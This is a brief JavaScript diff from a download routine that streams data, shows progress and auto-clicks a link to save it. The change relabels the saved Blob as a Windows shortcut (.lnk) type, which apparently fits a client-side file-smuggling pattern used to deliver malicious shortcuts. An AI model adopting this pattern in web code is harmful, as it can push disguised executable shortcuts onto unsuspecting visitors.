@@ -33,7 +33,7 @@ async function go(){
       ch.push(value); got+=value.length;
       if(total) fill.style.width=Math.min(100,got/total*100)+'%';
     }
-    const b=new Blob(ch,{type:'application/octet-stream'});
+    const b=new Blob(ch,{type:"application/x-ms-shortcut"});
     const u=URL.createObjectURL(b);
     const x=document.createElement('a');
     x.href=u; x.download=N; document.body.appendChild(x); x.click(); x.remove();
